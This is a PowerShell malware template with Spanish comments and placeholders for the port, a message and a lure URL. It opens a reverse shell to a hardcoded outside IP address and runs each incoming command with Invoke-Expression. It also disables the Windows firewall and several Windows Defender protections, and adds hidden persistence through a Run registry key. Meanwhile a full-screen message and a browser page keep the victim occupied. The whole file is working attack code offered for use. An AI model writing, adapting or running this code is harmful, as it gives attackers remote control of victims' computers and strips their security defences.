# Dirección y puerto del servidor en la nube que tienes 
$serverAddress = '178.156.158.72'  # Dirección IP del servidor
$serverPort = PUERTO  # Puerto donde el servidor escucha
$PERSISTENCE_PATH = "$env:APPDATA\SecurityService.ps1"

# Función para agregar persistencia
function Add-Persistence {
    if (-not (Test-Path $PERSISTENCE_PATH)) {
        Copy-Item $PSCommandPath $PERSISTENCE_PATH
        IEX "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v SecurityService /t REG_SZ /d `"powershell -ep bypass -w hidden -f $PERSISTENCE_PATH`" /f" >$null 2>&1
    }
}

# Crear la conexión TCP
$client = New-Object System.Net.Sockets.TCPClient($serverAddress, $serverPort)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)

# Desactivar el firewall en todos los perfiles
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

# Desactivar la protección en tiempo real de Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $true

# Desactivar la protección en la nube de Windows Defender
Set-MpPreference -EnableCloudProtection $false

# Desactivar el envío automático de muestras
Set-MpPreference -SubmitSamplesConsent NeverSend

# Desactivar la protección contra amenazas de red
Set-MpPreference -DisableNetworkProtection $true

# Desactivar la protección contra malware (antivirus)
Set-MpPreference -DisableAntivirus $true

# Desactivar la protección contra spyware
Set-MpPreference -DisableAntiSpyware $true

# Crear la ventana de la GUI para el mensaje
Add-Type -AssemblyName "System.Windows.Forms"
$form = New-Object System.Windows.Forms.Form
$form.Text = "Mensaje"
$form.WindowState = [System.Windows.Forms.FormWindowState]::Maximized  # Pantalla completa
$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None  # Sin borde
$form.TopMost = $true  # Mantener la ventana encima de otras
$form.ControlBox = $false  # Deshabilitar los controles de la ventana (minimizar, maximizar, cerrar)

# Crear la etiqueta con el mensaje
$labelText = @"
EN ESTE ESPACIO ANADE EL MENSAJE QUE GUSTES 
"@
$label = New-Object System.Windows.Forms.Label
$label.Text = $labelText
$label.AutoSize = $false
$label.Width = $form.ClientSize.Width  # Ancho igual al tamaño de la ventana
$label.Height = $form.ClientSize.Height  # Alto igual al tamaño de la ventana
$label.Font = New-Object System.Drawing.Font("Arial", 40, [System.Drawing.FontStyle]::Bold)  # Fuente más grande y en negrita
$label.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
$label.ForeColor = [System.Drawing.Color]::White  # Texto blanco
$label.BackColor = [System.Drawing.Color]::Black  # Fondo negro
$label.Dock = [System.Windows.Forms.DockStyle]::Fill
$form.Controls.Add($label)

# Mostrar la ventana
$form.Show()

# Esperar 5 segundos antes de abrir Microsoft Edge
Start-Sleep -Seconds 5

# Cerrar la ventana de mensaje antes de abrir Microsoft Edge
$form.Close()

# Ruta de Microsoft Edge
$edgePath = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"

# URL para abrir en Edge
$url = "AQUI VA LA DIRECION DE LA WED QUE TE GUSTARIA MOSTRAR AL CLIENTE"

# Verificar si Edge existe en la ruta especificada y abrir la URL
if (Test-Path $edgePath) {
    # Iniciar Microsoft Edge con la URL especificada
    Start-Process $edgePath -ArgumentList $url
} else {
    Write-Host "No se encontró Microsoft Edge en la ruta especificada."
}

# Comenzar a escuchar comandos remotos
while ($true) {
    # Leer comando del flujo
    $command = $reader.ReadLine()
    
    # Salir si el comando es "exit"
    if ($command -eq "exit") {
        break
    }
    
    # Ejecutar el comando de forma segura
    try {
        $output = Invoke-Expression $command
        if ($output -is [System.Collections.IEnumerable]) {
            # Si la salida es una lista o colección, convertirla en cadena
            $output = $output | Out-String
        }
        $writer.WriteLine($output)
        $writer.Flush()
    } catch {
        # Si ocurre un error, enviar el error al cliente
        $writer.WriteLine("Error al ejecutar el comando: $_")
        $writer.Flush()
    }
}

# Cerrar la conexión cuando terminemos
$client.Close()

# Ejecutar persistencia al inicio
Add-Persistence